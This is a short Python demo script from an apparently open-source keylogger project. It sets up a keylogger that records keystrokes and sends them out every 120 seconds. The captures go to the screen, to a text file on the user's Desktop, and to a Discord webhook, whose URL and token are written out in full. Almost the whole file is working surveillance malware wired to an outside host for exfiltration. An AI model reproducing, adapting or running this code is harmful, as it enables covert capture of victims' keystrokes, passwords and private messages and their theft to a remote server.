#!/usr/bin/env python3
# https://github.com/EONRaider/Keylogger

__author__ = "EONRaider @ keybase.io/eonraider"

import platform
from pathlib import Path

from keylogger import KeyLogger
from exfiltrators import Discord, Screen, TextFile


current_os = platform.system()
demo_file = {
    "Windows": r"Desktop\sample_log.txt",
    "Linux": "Desktop/sample_log.txt"
}

# Setting up the Keylogger to exfiltrate data every 120 seconds
keylogger = KeyLogger(exfil_time=120)

# Enabling STDOUT for demonstration/debugging purposes only
Screen(subject=keylogger)

# A demonstration file will be written to the current user's Desktop
TextFile(subject=keylogger,
         file_path=Path.home().joinpath(demo_file[current_os]))

# Captured data will be sent to a Discord server through a Webhook URL
Discord(subject=keylogger,
        host_name=platform.node(),
        webhook_url="https://discord.com/api/webhooks/896081552151306340/"
                    "ikFf8J24Yk1VWjMBMP_tjrcNHFuaIZWp0la8zoeZn1QAaQa93x7e"
                    "S24cFreKbfKyo49e")

keylogger.execute()
